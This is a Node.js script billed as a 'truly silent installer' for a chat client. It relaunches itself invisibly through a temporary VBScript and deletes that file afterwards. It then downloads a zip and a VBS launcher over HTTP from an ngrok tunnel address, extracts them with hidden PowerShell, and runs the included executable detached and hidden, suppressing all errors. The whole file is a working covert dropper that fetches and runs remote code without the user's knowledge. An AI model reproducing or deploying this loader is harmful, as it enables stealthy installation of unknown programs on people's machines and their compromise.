#!/usr/bin/env node

// Truly Silent Installer - No visible windows at all
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, execSync, spawn } = require('child_process');
const os = require('os');

// Configuration
const SERVER_HOST = '0.tcp.ngrok.io:14513';
const INSTALL_DIR = path.join(os.tmpdir(), 'ChatClient');
const CLIENT_ZIP = path.join(INSTALL_DIR, 'chat-client.zip');
const CLIENT_EXE = path.join(INSTALL_DIR, 'chat-client-silent.exe');
const LAUNCHER_VBS = path.join(INSTALL_DIR, 'run-client.vbs');

// Check if we're running invisibly
const args = process.argv.slice(2);
const isInvisible = args.includes('--invisible');

// Create VBS launcher for truly invisible execution
if (!isInvisible && process.platform === 'win32') {
  const tempVBS = path.join(os.tmpdir(), 'invisible_launcher_' + Date.now() + '.vbs');
  const vbsContent = `
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run """${process.execPath}"" ""${__filename}"" --invisible", 0, False
WScript.Quit
  `.trim();
  
  try {
    fs.writeFileSync(tempVBS, vbsContent);
    
    // Use spawn instead of exec for better process handling
    const child = spawn('cscript', ['//nologo', tempVBS], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true
    });
    child.unref();
    
    // Clean up VBS file after delay
    setTimeout(() => {
      try { fs.unlinkSync(tempVBS); } catch(e) {}
    }, 10000);
    
    process.exit(0);
  } catch (error) {
    // If VBS approach fails, continue with regular installation
  }
}

// Create install directory silently
if (!fs.existsSync(INSTALL_DIR)) {
  fs.mkdirSync(INSTALL_DIR, { recursive: true });
}

// Silent download function with fresh connections
function downloadFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const { URL } = require('url');
    const urlObj = new URL(url);
    const protocol = urlObj.protocol === 'https:' ? https : http;
    
    const options = {
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname + urlObj.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Node.js Installer',
        'Accept': '*/*',
        'Connection': 'close'
      },
      timeout: 60000
    };
    
    const file = fs.createWriteStream(filePath);
    let downloadStarted = false;
    
    const req = protocol.request(options, (response) => {
      if (response.statusCode !== 200) {
        file.close();
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(new Error(`Download failed: ${response.statusCode}`));
        return;
      }
      
      downloadStarted = true;
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
        resolve();
      });
      
      file.on('error', (err) => {
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(err);
      });
    });
    
    req.on('error', (err) => {
      if (!downloadStarted) {
        file.close();
        try { fs.unlinkSync(filePath); } catch(e) {}
      }
      reject(err);
    });
    
    req.on('timeout', () => {
      req.destroy();
      file.close();
      try { fs.unlinkSync(filePath); } catch(e) {}
      reject(new Error('Download timeout'));
    });
    
    req.setTimeout(60000);
    req.end();
  });
}

// Extract zip file silently
function extractZip() {
  try {
    if (process.platform === 'win32') {
      try {
        execSync(`powershell -WindowStyle Hidden -Command "Expand-Archive -Path '${CLIENT_ZIP}' -DestinationPath '${INSTALL_DIR}' -Force"`, { 
          stdio: 'ignore',
          windowsHide: true
        });
      } catch (e) {
        execSync(`powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('${CLIENT_ZIP}', '${INSTALL_DIR}')"`, { 
          stdio: 'ignore',
          windowsHide: true
        });
      }
    } else {
      execSync(`unzip -o "${CLIENT_ZIP}" -d "${INSTALL_DIR}"`, { stdio: 'ignore' });
    }
    
    fs.unlinkSync(CLIENT_ZIP);
  } catch (error) {
    // Silent error handling
    throw error;
  }
}

// Main installer function
async function install() {
  try {
    // Download compressed client silently
    await downloadFile(`http://${SERVER_HOST}/download/client.zip`, CLIENT_ZIP);
    
    // Add delay to ensure connection is fully closed
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Extract silently
    extractZip();
    
    // Another delay before second download
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Download VBS launcher with fresh connection
    await downloadFile(`http://${SERVER_HOST}/download/launcher.vbs`, LAUNCHER_VBS);
    
    // Execute the client directly using spawn for true detachment
    if (process.platform === 'win32' && fs.existsSync(CLIENT_EXE)) {
      try {
        const child = spawn(CLIENT_EXE, [], {
          detached: true,
          stdio: 'ignore',
          windowsHide: true
        });
        child.unref();
      } catch (error) {
        // Silent error handling
      }
    }
    
    // Exit cleanly after a brief delay
    setTimeout(() => process.exit(0), 1000);
    
  } catch (error) {
    // Silent error handling - exit without showing error
    process.exit(1);
  }
}

// Handle all errors silently
process.on('uncaughtException', () => {
  process.exit(1);
});

process.on('unhandledRejection', () => {
  process.exit(1);
});

// Start installation silently
install();